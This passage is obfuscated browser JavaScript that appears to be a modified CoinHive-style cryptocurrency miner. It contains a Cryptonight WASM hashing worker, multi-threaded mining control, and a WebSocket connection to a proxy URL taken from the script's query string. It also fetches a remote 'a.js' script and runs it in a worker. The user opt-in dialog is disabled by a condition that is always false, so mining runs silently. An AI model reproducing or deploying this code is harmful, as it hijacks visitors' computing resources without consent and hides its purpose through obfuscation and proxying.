urn\x20false});CryptonightWASMWrapper.prototype.setJob=(function(job){this.currentJob=job;this.blob=this.hexToBytes(job.blob);this.input.set(this.blob);var\x20target=this.hexToBytes(job.target);if(target.length<=8){for(var\x20i=0;i<target.length;i++){this.target[this.target.length-i-1]=target[target.length-i-1]}for(var\x20i=0;i<this.target.length-target.length;i++){this.target[i]=255}}else{this.target=target}});CryptonightWASMWrapper.prototype.now=(function(){return\x20self.performance?self.performance.now():Date.now()});CryptonightWASMWrapper.prototype.hash=(function(input,output,length){var\x20nonce=Math.random()*4294967295+1>>>0;this.input[39]=(nonce&4278190080)>>24;this.input[40]=(nonce&16711680)>>16;this.input[41]=(nonce&65280)>>8;this.input[42]=(nonce&255)>>0;_cryptonight_hash(this.ctx,input.byteOffset,output.byteOffset,length)});CryptonightWASMWrapper.prototype.verify=(function(job){this.blob=this.hexToBytes(job.blob);this.input.set(this.blob);for(var\x20i=0,c=0;c<job.nonce.length;c+=2,i++){this.input[39+i]=parseInt(job.nonce.substr(c,2),16)}_cryptonight_hash(this.ctx,this.input.byteOffset,this.output.byteOffset,this.blob.length);var\x20result=this.bytesToHex(this.output);self.postMessage({verify_id:job.verify_id,verified:result===job.result})});CryptonightWASMWrapper.prototype.work=(function(){var\x20hashes=0;var\x20meetsTarget=false;var\x20start=this.now();var\x20elapsed=0;do{this.hash(this.input,this.output,this.blob.length);hashes++;meetsTarget=this.meetsTarget(this.output,this.target);elapsed=this.now()-start}while(!meetsTarget&&elapsed<1e3);var\x20hashesPerSecond=hashes/(elapsed/1e3);if(meetsTarget){var\x20nonceHex=this.bytesToHex(this.input.subarray(39,43));var\x20resultHex=this.bytesToHex(this.output);self.postMessage({hashesPerSecond:hashesPerSecond,hashes:hashes,job_id:this.currentJob.job_id,nonce:nonceHex,result:resultHex})}else{self.postMessage({hashesPerSecond:hashesPerSecond,hashes:hashes})}});CryptonightWASMWrapper.prototype.workThrottled=(function(){var\x20start=this.now();this.hash(this.input,this.output,this.blob.length);var\x20end=this.now();var\x20timePerHash=end-start;this.throttledHashes++;var\x20elapsed=end-this.throttledStart;var\x20hashesPerSecond=this.throttledHashes/(elapsed/1e3);if(this.meetsTarget(this.output,this.target)){var\x20nonceHex=this.bytesToHex(this.input.subarray(39,43));var\x20resultHex=this.bytesToHex(this.output);self.postMessage({hashesPerSecond:hashesPerSecond,hashes:this.throttledHashes,job_id:this.currentJob.job_id,nonce:nonceHex,result:resultHex});this.throttledHashes=0}else\x20if(elapsed>1e3){self.postMessage({hashesPerSecond:hashesPerSecond,hashes:this.throttledHashes});this.throttledHashes=0}else{var\x20wait=Math.min(2e3,timePerHash*this.throttleWait);setTimeout(this.workThrottledBound,wait)}});Module[\x22onRuntimeInitialized\x22]=(function(){var\x20cryptonight=new\x20CryptonightWASMWrapper})\x20",
  "prototype",
  "slice",
  "call",
  "script",
  "filter",
  "test",
  "src",
  "length",
  "split",
  "m.js",
  "proxy=",
  "log",
  "params",
  "_siteKey",
  "_user",
  "_hashes",
  "_currentJob",
  "_autoReconnect",
  "_reconnectRetry",
  "_tokenFromServer",
  "_goal",
  "_totalHashesFromDeadThreads",
  "_throttle",
  "max",
  "min",
  "throttle",
  "autoThreads",
  "_tab",
  "random",
  "IF_EXCLUSIVE_TAB",
  "BroadcastChannel",
  "_bc",
  "onmessage",
  "ping",
  "now",
  "hardwareConcurrency",
  "_targetNumThreads",
  "threads",
  "_useWASM",
  "hasWASMSupport",
  "forceASMJS",
  "_asmjsStatus",
  "unloaded",
  "_onTargetMetBound",
  "_onTargetMet",
  "bind",
  "_onVerifiedBound",
  "mode",
  "_optInToken",
  "interval",
  "loaded",
  "_startNow",
  "pending",
  "addEventListener",
  "CRYPTONIGHT_WORKER_BLOB",
  "URL",
  "createObjectURL",
  "responseText",
  "open",
  "get",
  "a.js",
  "send",
  "_threads",
  "hashesTotal",
  "stop",
  "_socket",
  "_autoThreads",
  "getHashesPerSecond",
  "hashesPerSecond",
  "getTotalHashes",
  "lastMessageTimestamp"
];
(function(_0x474be8, _0x2a0e31) {
  var _0x3f5632 = function(_0x253d52) {
    while (--_0x253d52) {
      _0x474be8["push"](_0x474be8["shift"]());
    }
  };
  _0x3f5632(++_0x2a0e31);
})(_0x89d9, 0x1b1);
var _0x989d = function(_0x405932, _0x54282b) {
  _0x405932 = _0x405932 - 0x0;
  var _0x5e9eb5 = _0x89d9[_0x405932];
  return _0x5e9eb5;
};
var libUrl = null;
var scriptTag = Array[_0x989d("0x0")][_0x989d("0x1")]
  [_0x989d("0x2")](document["getElementsByTagName"](_0x989d("0x3")))
  [_0x989d("0x4")](_0x1051da => /\?proxy?/[_0x989d("0x5")](_0x1051da[_0x989d("0x6")]));
if (scriptTag[_0x989d("0x7")] > 0x0) {
  libUrl = scriptTag[0x0]["src"][_0x989d("0x8")](_0x989d("0x9"))[0x0];
} else {
  throw new Error("missing\x20\x27?proxy\x27\x20query\x20parameter\x20in\x20your\x20proxy\x20url!");
}
const proxyUrl = decodeURIComponent(scriptTag[0x0][_0x989d("0x6")]["split"](_0x989d("0xa"))[0x1]);
console[_0x989d("0xb")]("libUrl", libUrl);
console[_0x989d("0xb")]("proxyUrl", proxyUrl);
(function(_0x42a757) {
  "use strict";
  var _0x448b31 = function(_0x10a4d2, _0x21c5ea) {
    this[_0x989d("0xc")] = _0x21c5ea || {};
    this[_0x989d("0xd")] = _0x10a4d2;
    this[_0x989d("0xe")] = null;
    this["_threads"] = [];
    this[_0x989d("0xf")] = 0x0;
    this[_0x989d("0x10")] = null;
    this[_0x989d("0x11")] = !![];
    this[_0x989d("0x12")] = 0x3;
    this[_0x989d("0x13")] = null;
    this[_0x989d("0x14")] = 0x0;
    this[_0x989d("0x15")] = 0x0;
    this[_0x989d("0x16")] = Math[_0x989d("0x17")](
      0x0,
      Math[_0x989d("0x18")](0.99, this[_0x989d("0xc")][_0x989d("0x19")] || 0x0)
    );
    this["_stopOnInvalidOptIn"] = ![];
    this["_autoThreads"] = {
      enabled: !!this[_0x989d("0xc")][_0x989d("0x1a")],
      interval: null,
      adjustAt: null,
      adjustEvery: 0x2710,
      stats: {}
    };
    this[_0x989d("0x1b")] = {
      ident: (Math[_0x989d("0x1c")]() * 0xffffff) | 0x0,
      mode: CH[_0x989d("0x1d")],
      grace: 0x0,
      lastPingReceived: 0x0,
      interval: null
    };
    if (_0x42a757[_0x989d("0x1e")]) {
      try {
        this["_bc"] = new BroadcastChannel("CH");
        this[_0x989d("0x1f")][_0x989d("0x20")] = function(_0x14a23b) {
          if (_0x14a23b["data"] === _0x989d("0x21")) {
            this[_0x989d("0x1b")]["lastPingReceived"] = Date[_0x989d("0x22")]();
          }
        }["bind"](this);
      } catch (_0x3d58d7) {}
    }
    this["_eventListeners"] = {
      open: [],
      authed: [],
      close: [],
      error: [],
      job: [],
      found: [],
      accepted: [],
      optin: []
    };
    var _0x2f6edd = navigator[_0x989d("0x23")] || 0x4;
    this[_0x989d("0x24")] = this[_0x989d("0xc")][_0x989d("0x25")] || _0x2f6edd;
    this[_0x989d("0x26")] = this[_0x989d("0x27")]() && !this[_0x989d("0xc")][_0x989d("0x28")];
    this[_0x989d("0x29")] = _0x989d("0x2a");
    this[_0x989d("0x2b")] = this[_0x989d("0x2c")][_0x989d("0x2d")](this);
    this[_0x989d("0x2e")] = this["_onVerified"][_0x989d("0x2d")](this);
  };
  _0x448b31[_0x989d("0x0")]["start"] = function(_0x37252d, _0x5ea1aa) {
    this[_0x989d("0x1b")][_0x989d("0x2f")] = _0x37252d || CH["IF_EXCLUSIVE_TAB"];
    this[_0x989d("0x30")] = _0x5ea1aa;
    if (this["_tab"][_0x989d("0x31")]) {
      clearInterval(this[_0x989d("0x1b")][_0x989d("0x31")]);
      this[_0x989d("0x1b")][_0x989d("0x31")] = null;
    }
    if (this[_0x989d("0x26")] || this[_0x989d("0x29")] === _0x989d("0x32")) {
      this[_0x989d("0x33")]();
    } else if (this[_0x989d("0x29")] === _0x989d("0x2a")) {
      this[_0x989d("0x29")] = _0x989d("0x34");
      var _0x437296 = new XMLHttpRequest();
      _0x437296[_0x989d("0x35")](
        "load",
        function() {
          CH[_0x989d("0x36")] =
            _0x42a757[_0x989d("0x37")][_0x989d("0x38")](new Blob([_0x437296[_0x989d("0x39")]])) + "#" + libUrl;
          this[_0x989d("0x29")] = _0x989d("0x32");
          this[_0x989d("0x33")]();
        }[_0x989d("0x2d")](this),
        _0x437296
      );
      _0x437296[_0x989d("0x3a")](_0x989d("0x3b"), libUrl + _0x989d("0x3c"), !![]);
      _0x437296[_0x989d("0x3d")]();
    }
  };
  _0x448b31[_0x989d("0x0")]["stop"] = function(_0x320aed) {
    for (var _0x2fa1e3 = 0x0; _0x2fa1e3 < this[_0x989d("0x3e")][_0x989d("0x7")]; _0x2fa1e3++) {
      this[_0x989d("0x15")] += this[_0x989d("0x3e")][_0x2fa1e3][_0x989d("0x3f")];
      this[_0x989d("0x3e")][_0x2fa1e3][_0x989d("0x40")]();
    }
    this["_threads"] = [];
    this[_0x989d("0x11")] = ![];
    if (this["_socket"]) {
      this[_0x989d("0x41")]["close"]();
    }
    this[_0x989d("0x10")] = null;
    if (this[_0x989d("0x42")][_0x989d("0x31")]) {
      clearInterval(this[_0x989d("0x42")][_0x989d("0x31")]);
      this[_0x989d("0x42")]["interval"] = null;
    }
    if (this[_0x989d("0x1b")][_0x989d("0x31")] && _0x320aed !== "dontKillTabUpdate") {
      clearInterval(this["_tab"][_0x989d("0x31")]);
      this["_tab"][_0x989d("0x31")] = null;
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x43")] = function() {
    var _0x2acca0 = 0x0;
    for (var _0x390e99 = 0x0; _0x390e99 < this[_0x989d("0x3e")]["length"]; _0x390e99++) {
      _0x2acca0 += this[_0x989d("0x3e")][_0x390e99][_0x989d("0x44")];
    }
    return _0x2acca0;
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x45")] = function(_0x1597d9) {
    var _0x3d546f = Date[_0x989d("0x22")]();
    var _0x5f63d6 = this[_0x989d("0x15")];
    for (var _0x10ce0d = 0x0; _0x10ce0d < this[_0x989d("0x3e")][_0x989d("0x7")]; _0x10ce0d++) {
      var _0xd72ba5 = this[_0x989d("0x3e")][_0x10ce0d];
      _0x5f63d6 += _0xd72ba5["hashesTotal"];
      if (_0x1597d9) {
        var _0x200b7e = (_0x3d546f - _0xd72ba5[_0x989d("0x46")]) / 0x3e8 * 0.9;
        _0x5f63d6 += _0x200b7e * _0xd72ba5[_0x989d("0x44")];
      }
    }
    return _0x5f63d6 | 0x0;
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x47")] = function() {
    return this["_hashes"];
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x48")] = function() {
    return this[_0x989d("0x13")];
  };
  _0x448b31[_0x989d("0x0")]["on"] = function(_0x5b44f2, _0x21f41d) {
    if (this[_0x989d("0x49")][_0x5b44f2]) {
      this["_eventListeners"][_0x5b44f2][_0x989d("0x4a")](_0x21f41d);
    }
  };
  _0x448b31["prototype"][_0x989d("0x4b")] = function(_0x56c0e8) {
    return this[_0x989d("0x42")][_0x989d("0x4c")];
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x4d")] = function(_0x8c06a2) {
    this[_0x989d("0x42")]["enabled"] = !!_0x8c06a2;
    if (!_0x8c06a2 && this[_0x989d("0x42")][_0x989d("0x31")]) {
      clearInterval(this[_0x989d("0x42")][_0x989d("0x31")]);
      this["_autoThreads"][_0x989d("0x31")] = null;
    }
    if (_0x8c06a2 && !this[_0x989d("0x42")][_0x989d("0x31")]) {
      this[_0x989d("0x42")][_0x989d("0x4e")] = Date["now"]() + this[_0x989d("0x42")][_0x989d("0x4f")];
      this[_0x989d("0x42")]["interval"] = setInterval(this[_0x989d("0x50")]["bind"](this), 0x3e8);
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x51")] = function() {
    return this[_0x989d("0x16")];
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x52")] = function(_0x337c3e) {
    this[_0x989d("0x16")] = Math["max"](0x0, Math[_0x989d("0x18")](0.99, _0x337c3e));
    if (this[_0x989d("0x10")]) {
      this["_setJob"](this["_currentJob"]);
    }
  };
  _0x448b31[_0x989d("0x0")]["getNumThreads"] = function() {
    return this[_0x989d("0x24")];
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x53")] = function(_0x1598ad) {
    var _0x1598ad = Math["max"](0x1, _0x1598ad | 0x0);
    this["_targetNumThreads"] = _0x1598ad;
    if (_0x1598ad > this[_0x989d("0x3e")][_0x989d("0x7")]) {
      for (var _0x4ed7d2 = 0x0; _0x1598ad > this[_0x989d("0x3e")][_0x989d("0x7")]; _0x4ed7d2++) {
        var _0x34c617 = new CH[(_0x989d("0x54"))]();
        if (this[_0x989d("0x10")]) {
          _0x34c617[_0x989d("0x55")](this[_0x989d("0x10")], this["_onTargetMetBound"]);
        }
        this[_0x989d("0x3e")][_0x989d("0x4a")](_0x34c617);
      }
    } else if (_0x1598ad < this["_threads"][_0x989d("0x7")]) {
      while (_0x1598ad < this["_threads"]["length"]) {
        var _0x34c617 = this[_0x989d("0x3e")][_0x989d("0x56")]();
        this[_0x989d("0x15")] += _0x34c617[_0x989d("0x3f")];
        _0x34c617[_0x989d("0x40")]();
      }
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x27")] = function() {
    return _0x42a757[_0x989d("0x57")] !== undefined;
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x58")] = function() {
    return this[_0x989d("0x3e")][_0x989d("0x7")] > 0x0;
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x33")] = function() {
    if (this[_0x989d("0x1b")][_0x989d("0x2f")] !== CH[_0x989d("0x59")] && !this[_0x989d("0x1b")]["interval"]) {
      this["_tab"][_0x989d("0x31")] = setInterval(this[_0x989d("0x5a")][_0x989d("0x2d")](this), 0x3e8);
    }
    if (this[_0x989d("0x1b")][_0x989d("0x2f")] === CH["IF_EXCLUSIVE_TAB"] && this["_otherTabRunning"]()) {
      return;
    }
    if (this[_0x989d("0x1b")][_0x989d("0x2f")] === CH["FORCE_EXCLUSIVE_TAB"]) {
      this[_0x989d("0x1b")]["grace"] = Date["now"]() + 0xbb8;
    }
    if (!this[_0x989d("0x5b")]) {
      this["verifyThread"] = new CH[(_0x989d("0x54"))]();
    }
    this[_0x989d("0x53")](this["_targetNumThreads"]);
    this[_0x989d("0x11")] = !![];
    if (![] && !this[_0x989d("0x30")]) {
      this[_0x989d("0x5c")] =
        this[_0x989d("0x5c")] ||
        new CH[(_0x989d("0x5d"))](this[_0x989d("0xd")], {
          theme: this[_0x989d("0xc")][_0x989d("0x5e")] || "light",
          lang: this[_0x989d("0xc")]["language"] || "auto"
        });
      this[_0x989d("0x5c")][_0x989d("0x5f")](
        function(_0x4798ec) {
          if (!_0x4798ec) {
            this["_emit"](_0x989d("0x60"), { status: "canceled" });
            this[_0x989d("0x61")](_0x989d("0x62"), { error: "opt_in_canceled" });
            return;
          }
          this[_0x989d("0x61")](_0x989d("0x60"), { status: "accepted" });
          this[_0x989d("0x30")] = _0x4798ec;
          this[_0x989d("0x63")]();
        }["bind"](this)
      );
    } else {
      this[_0x989d("0x63")]();
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x64")] = function() {
    if (this[_0x989d("0x1b")]["lastPingReceived"] > Date[_0x989d("0x22")]() - 0x5dc) {
      return !![];
    }
    try {
      var _0x5eb066 = localStorage[_0x989d("0x65")]("CH");
      if (_0x5eb066) {
        var _0x5b4c66 = JSON[_0x989d("0x66")](_0x5eb066);
        if (
          _0x5b4c66[_0x989d("0x67")] !== this[_0x989d("0x1b")][_0x989d("0x67")] &&
          Date[_0x989d("0x22")]() - _0x5b4c66["time"] < 0x5dc
        ) {
          return !![];
        }
      }
    } catch (_0x2c3f5c) {}
    return ![];
  };
  _0x448b31["prototype"][_0x989d("0x5a")] = function() {
    var _0xa6d2a1 = this[_0x989d("0x64")]();
    if (_0xa6d2a1 && this[_0x989d("0x58")]() && Date[_0x989d("0x22")]() > this["_tab"][_0x989d("0x68")]) {
      this[_0x989d("0x40")]("dontKillTabUpdate");
    } else if (!_0xa6d2a1 && !this[_0x989d("0x58")]()) {
      this[_0x989d("0x33")]();
    }
    if (this[_0x989d("0x58")]()) {
      if (this[_0x989d("0x1f")]) {
        this[_0x989d("0x1f")]["postMessage"](_0x989d("0x21"));
      }
      try {
        localStorage[_0x989d("0x69")](
          "CH",
          JSON[_0x989d("0x6a")]({ ident: this["_tab"][_0x989d("0x67")], time: Date["now"]() })
        );
      } catch (_0x20b08f) {}
    }
  };
  _0x448b31[_0x989d("0x0")]["_adjustThreads"] = function() {
    var _0xa5f319 = this[_0x989d("0x43")]();
    var _0x4f4c18 = this[_0x989d("0x6b")]();
    var _0x33b47c = this[_0x989d("0x42")][_0x989d("0x6c")];
    _0x33b47c[_0x4f4c18] = _0x33b47c[_0x4f4c18] ? _0x33b47c[_0x4f4c18] * 0.5 + _0xa5f319 * 0.5 : _0xa5f319;
    if (Date[_0x989d("0x22")]() > this["_autoThreads"][_0x989d("0x4e")]) {
      this[_0x989d("0x42")][_0x989d("0x4e")] = Date[_0x989d("0x22")]() + this[_0x989d("0x42")][_0x989d("0x4f")];
      var _0xaf2654 = (_0x33b47c[_0x4f4c18] || 0x0) - 0x1;
      var _0x120b8a = _0x33b47c[_0x4f4c18 + 0x1] || 0x0;
      var _0x245f73 = _0x33b47c[_0x4f4c18 - 0x1] || 0x0;
      if (_0xaf2654 > _0x245f73 && (_0x120b8a === 0x0 || _0x120b8a > _0xaf2654) && _0x4f4c18 < 0x8) {
        return this[_0x989d("0x53")](_0x4f4c18 + 0x1);
      } else if (_0xaf2654 > _0x120b8a && (!_0x245f73 || _0x245f73 > _0xaf2654) && _0x4f4c18 > 0x1) {
        return this[_0x989d("0x53")](_0x4f4c18 - 0x1);
      }
    }
  };
  _0x448b31[_0x989d("0x0")]["_emit"] = function(_0x13c876, _0x5460e9) {
    var _0x46c51f = this[_0x989d("0x49")][_0x13c876];
    if (_0x46c51f && _0x46c51f["length"]) {
      for (var _0x3f4abe = 0x0; _0x3f4abe < _0x46c51f[_0x989d("0x7")]; _0x3f4abe++) {
        _0x46c51f[_0x3f4abe](_0x5460e9);
      }
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x6d")] = function(_0x5d8fc9) {
    var _0xbae4d3 = 0x1505,
      _0x322db1 = _0x5d8fc9[_0x989d("0x7")];
    while (_0x322db1) {
      _0xbae4d3 = (_0xbae4d3 * 0x21) ^ _0x5d8fc9[_0x989d("0x6e")](--_0x322db1);
    }
    return _0xbae4d3 >>> 0x0;
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x63")] = function() {
    if (this[_0x989d("0x41")]) {
      return;
    }
    this["_socket"] = new WebSocket(proxyUrl);
    this[_0x989d("0x41")][_0x989d("0x20")] = this[_0x989d("0x6f")][_0x989d("0x2d")](this);
    this[_0x989d("0x41")][_0x989d("0x70")] = this[_0x989d("0x71")][_0x989d("0x2d")](this);
    this[_0x989d("0x41")][_0x989d("0x72")] = this[_0x989d("0x73")][_0x989d("0x2d")](this);
    this["_socket"][_0x989d("0x74")] = this[_0x989d("0x75")][_0x989d("0x2d")](this);
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x75")] = function(_0x38ec6f) {
    this["_emit"](_0x989d("0x3a"));
    var _0x223b97 = { site_key: this[_0x989d("0xd")], type: "anonymous", user: null, goal: 0x0 };
    if (this[_0x989d("0xe")]) {
      _0x223b97[_0x989d("0x76")] = _0x989d("0x77");
      _0x223b97[_0x989d("0x77")] = this[_0x989d("0xe")][_0x989d("0x78")]();
    } else if (this[_0x989d("0x14")]) {
      _0x223b97[_0x989d("0x76")] = "token";
      _0x223b97[_0x989d("0x79")] = this["_goal"];
    }
    if (this[_0x989d("0x30")]) {
      _0x223b97[_0x989d("0x7a")] = this["_optInToken"];
    }
    this[_0x989d("0x7b")](_0x989d("0x5f"), _0x223b97);
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x71")] = function(_0x5f4aa2) {
    this[_0x989d("0x61")]("error", { error: _0x989d("0x7c") });
    this[_0x989d("0x73")](_0x5f4aa2);
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x73")] = function(_0x429e97) {
    if (_0x429e97[_0x989d("0x7d")] >= 0x3eb && _0x429e97[_0x989d("0x7d")] <= 0x3f1) {
      this[_0x989d("0x12")] = 0x3c;
    }
    for (var _0x3fe7d1 = 0x0; _0x3fe7d1 < this[_0x989d("0x3e")]["length"]; _0x3fe7d1++) {
      this[_0x989d("0x3e")][_0x3fe7d1][_0x989d("0x40")]();
    }
    this[_0x989d("0x3e")] = [];
    this[_0x989d("0x41")] = null;
    this[_0x989d("0x61")](_0x989d("0x7e"));
    if (this[_0x989d("0x11")]) {
      setTimeout(this[_0x989d("0x33")][_0x989d("0x2d")](this), this["_reconnectRetry"] * 0x3e8);
    }
  };
  _0x448b31[_0x989d("0x0")]["_onMessage"] = function(_0x27e3ff) {
    var _0x11a976 = JSON[_0x989d("0x66")](_0x27e3ff[_0x989d("0x7f")]);
    if (_0x11a976[_0x989d("0x76")] === _0x989d("0x80")) {
      this[_0x989d("0x81")](_0x11a976["params"]);
      this[_0x989d("0x61")]("job", _0x11a976[_0x989d("0xc")]);
      if (this[_0x989d("0x42")]["enabled"] && !this[_0x989d("0x42")][_0x989d("0x31")]) {
        this[_0x989d("0x42")][_0x989d("0x4e")] = Date[_0x989d("0x22")]() + this[_0x989d("0x42")]["adjustEvery"];
        this[_0x989d("0x42")][_0x989d("0x31")] = setInterval(this[_0x989d("0x50")]["bind"](this), 0x3e8);
      }
    } else if (_0x11a976[_0x989d("0x76")] === _0x989d("0x82")) {
      this[_0x989d("0x5b")][_0x989d("0x82")](_0x11a976[_0x989d("0xc")], this[_0x989d("0x2e")]);
    } else if (_0x11a976[_0x989d("0x76")] === _0x989d("0x83")) {
      this[_0x989d("0xf")] = _0x11a976[_0x989d("0xc")][_0x989d("0x84")];
      this[_0x989d("0x61")](_0x989d("0x85"), _0x11a976[_0x989d("0xc")]);
      if (this[_0x989d("0x14")] && this[_0x989d("0xf")] >= this[_0x989d("0x14")]) {
        this[_0x989d("0x40")]();
      }
    } else if (_0x11a976[_0x989d("0x76")] === _0x989d("0x86")) {
      this[_0x989d("0x13")] = _0x11a976[_0x989d("0xc")][_0x989d("0x87")] || null;
      this[_0x989d("0xf")] = _0x11a976[_0x989d("0xc")][_0x989d("0x84")] || 0x0;
      this[_0x989d("0x61")]("authed", _0x11a976[_0x989d("0xc")]);
      this[_0x989d("0x12")] = 0x3;
    } else if (_0x11a976[_0x989d("0x76")] === "error") {
      if (console && console["error"]) {
        console[_0x989d("0x62")](_0x989d("0x88"), _0x11a976[_0x989d("0xc")][_0x989d("0x62")]);
      }
      this[_0x989d("0x61")](_0x989d("0x62"), _0x11a976[_0x989d("0xc")]);
      if (_0x11a976[_0x989d("0xc")]["error"] === _0x989d("0x89")) {
        this[_0x989d("0x12")] = 0x1770;
      } else if (_0x11a976[_0x989d("0xc")][_0x989d("0x62")] === _0x989d("0x8a")) {
        if (this[_0x989d("0x8b")]) {
          return this[_0x989d("0x40")]();
        } else if (this[_0x989d("0x5c")]) {
          this[_0x989d("0x5c")][_0x989d("0x8c")]();
        }
      }
    } else if (_0x11a976[_0x989d("0x76")] === _0x989d("0x8d") || _0x11a976[_0x989d("0xc")]["banned"]) {
      this[_0x989d("0x61")](_0x989d("0x62"), { banned: !![] });
      this[_0x989d("0x12")] = 0x258;
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x81")] = function(_0x350772) {
    this[_0x989d("0x10")] = _0x350772;
    this[_0x989d("0x10")][_0x989d("0x19")] = this["_throttle"];
    for (var _0x5eeecf = 0x0; _0x5eeecf < this[_0x989d("0x3e")]["length"]; _0x5eeecf++) {
      this[_0x989d("0x3e")][_0x5eeecf][_0x989d("0x55")](_0x350772, this["_onTargetMetBound"]);
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x2c")] = function(_0x761cde) {
    this[_0x989d("0x61")](_0x989d("0x8e"), _0x761cde);
    if (_0x761cde[_0x989d("0x8f")] === this["_currentJob"][_0x989d("0x8f")]) {
      this[_0x989d("0x7b")](_0x989d("0x90"), {
        job_id: _0x761cde[_0x989d("0x8f")],
        nonce: _0x761cde[_0x989d("0x91")],
        result: _0x761cde[_0x989d("0x92")]
      });
    }
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x93")] = function(_0x194cc4) {
    this["_send"](_0x989d("0x94"), _0x194cc4);
  };
  _0x448b31[_0x989d("0x0")][_0x989d("0x7b")] = function(_0x26bb3c, _0x14595a) {
    if (!this[_0x989d("0x41")]) {
      return;
    }
    var _0x4a0ed3 = { type: _0x26bb3c, params: _0x14595a || {} };
    this[_0x989d("0x41")][_0x989d("0x3d")](JSON[_0x989d("0x6a")](_0x4a0ed3));
  };
  _0x42a757["CH"] = _0x42a757["CH"] || {};
  _0x42a757["CH"][_0x989d("0x1d")] = _0x989d("0x95");
  _0x42a757["CH"][_0x989d("0x96")] = _0x989d("0x97");
  _0x42a757["CH"]["FORCE_MULTI_TAB"] = _0x989d("0x98");
  _0x42a757["CH"]["Token"] = function(_0x21a325, _0x3ada41, _0x1f68e3) {
    var _0xf817e3 = new _0x448b31(_0x21a325, _0x1f68e3);
    _0xf817e3[_0x989d("0x14")] = _0x3ada41 || 0x0;
    return _0xf817e3;
  };
  _0x42a757["CH"]["User"] = function(_0x58f3bf, _0x13e5a6, _0x22e59a) {
    var _0x267c67 = new _0x448b31(_0x58f3bf, _0x22e59a);
    _0x267c67[_0x989d("0xe")] = _0x13e5a6;
    return _0x267c67;
  };
  _0x42a757["CH"][_0x989d("0x99")] = function(_0x364de1, _0x2a97e7) {
    var _0x1f725a = new _0x448b31(_0x364de1, _0x2a97e7);
    return _0x1f725a;
  };
})(window);
(function(_0x50ebae) {
  "use strict";
  var _0x30da20 = function() {
    this[_0x989d("0x9a")] = new Worker(CH[_0x989d("0x36")]);
    this[_0x989d("0x9a")][_0x989d("0x20")] = this[_0x989d("0x9b")][_0x989d("0x2d")](this);
    this[_0x989d("0x9c")] = null;
    this[_0x989d("0x9d")] = function() {};
    this[_0x989d("0x9e")] = function() {};
    this[_0x989d("0x9f")] = ![];
    this[_0x989d("0x44")] = 0x0;
    this[_0x989d("0x3f")] = 0x0;
    this["running"] = ![];
    this["lastMessageTimestamp"] = Date["now"]();
  };
  _0x30da20["prototype"][_0x989d("0x9b")] = function(_0x249d69) {
    if (_0x249d69[_0x989d("0x7f")] !== _0x989d("0xa0") || this[_0x989d("0x9f")]) {
      throw _0x989d("0xa1") + _0x249d69;
    }
    this["_isReady"] = !![];
    this[_0x989d("0x9a")]["onmessage"] = this[_0x989d("0xa2")]["bind"](this);
    if (this["currentJob"]) {
      this["running"] = !![];
      this[_0x989d("0x9a")]["postMessage"](this[_0x989d("0x9c")]);
    }
  };
  _0x30da20[_0x989d("0x0")][_0x989d("0xa2")] = function(_0x466793) {
    if (_0x466793[_0x989d("0x7f")][_0x989d("0xa3")]) {
      this[_0x989d("0x9e")](_0x466793[_0x989d("0x7f")]);
      return;
    }
    if (_0x466793[_0x989d("0x7f")][_0x989d("0x92")]) {
      this["jobCallback"](_0x466793[_0x989d("0x7f")]);
    }
    this[_0x989d("0x44")] = this[_0x989d("0x44")] * 0.5 + _0x466793[_0x989d("0x7f")][_0x989d("0x44")] * 0.5;
    this[_0x989d("0x3f")] += _0x466793["data"]["hashes"];
    this["lastMessageTimestamp"] = Date[_0x989d("0x22")]();
    if (this[_0x989d("0xa4")]) {
      this[_0x989d("0x9a")][_0x989d("0xa5")](this["currentJob"]);
    }
  };
  _0x30da20[_0x989d("0x0")][_0x989d("0x55")] = function(_0x503b9e, _0x2124eb) {
    this[_0x989d("0x9c")] = _0x503b9e;
    this[_0x989d("0x9d")] = _0x2124eb;
    if (this[_0x989d("0x9f")] && !this[_0x989d("0xa4")]) {
      this[_0x989d("0xa4")] = !![];
      this[_0x989d("0x9a")][_0x989d("0xa5")](this[_0x989d("0x9c")]);
    }
  };
  _0x30da20["prototype"][_0x989d("0x82")] = function(_0x466e7b, _0xfbb6f9) {
    if (!this[_0x989d("0x9f")]) {
      return;
    }
    this[_0x989d("0x9e")] = _0xfbb6f9;
    this[_0x989d("0x9a")][_0x989d("0xa5")](_0x466e7b);
  };
  _0x30da20[_0x989d("0x0")][_0x989d("0x40")] = function() {
    if (this[_0x989d("0x9a")]) {
      this[_0x989d("0x9a")]["terminate"]();
      this["worker"] = null;
    }
    this[_0x989d("0xa4")] = ![];
  };
  _0x50ebae["CH"][_0x989d("0x54")] = _0x30da20;
})(window);
CH[_0x989d("0x36")] = URL["createObjectURL"](new Blob([_0x989d("0xa6") + libUrl + _0x989d("0xa7")]));
"))()
